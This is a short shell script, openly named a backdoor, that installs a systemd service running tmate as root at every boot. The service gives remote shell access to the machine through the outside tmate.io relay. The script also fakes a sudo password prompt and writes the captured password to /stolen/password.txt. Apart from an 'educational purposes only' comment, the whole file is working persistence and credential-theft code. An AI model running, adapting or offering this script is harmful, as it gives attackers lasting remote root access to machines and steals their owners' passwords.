#!/bin/sh
# Requires tmate and systemd
# ssh user/session_name@sgp1.tmate.io
# https://tmate.io/t/user/session_name

# Experimental
# This script is for educational purposes only

SESSION_NAME=""
API_KEY=""

SERVICE_NAME="backdoor"

SERVICE_CONTENT="[Unit]
Description=Tmate Backdoor
After=network.target
Wants=network-online.target

[Service]
Restart=always
User=root
Type=simple
ExecStart=tmate -k $API_KEY -n $SESSION_NAME -F

[Install]
WantedBy=multi-user.target
"

SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"
echo "$SERVICE_CONTENT" | sudo tee "$SERVICE_FILE"

echo "[sudo] password for $USER:"
stty -echo
read -r password
stty echo
echo

sudo mkdir -p /stolen
echo "$password" | sudo tee /stolen/password.txt >/dev/null

sudo systemctl daemon-reload
sudo systemctl enable "$SERVICE_NAME"
sudo systemctl start "$SERVICE_NAME"
